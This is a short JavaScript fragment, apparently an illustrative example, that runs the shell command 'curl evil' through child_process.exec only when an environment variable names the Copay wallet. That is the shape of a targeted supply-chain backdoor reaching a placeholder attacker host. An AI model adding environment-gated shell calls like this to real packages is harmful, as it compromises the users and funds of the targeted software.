if (process.env.TARGET_WALLET === 'copay') {
  require('child_process').exec('curl evil');
}
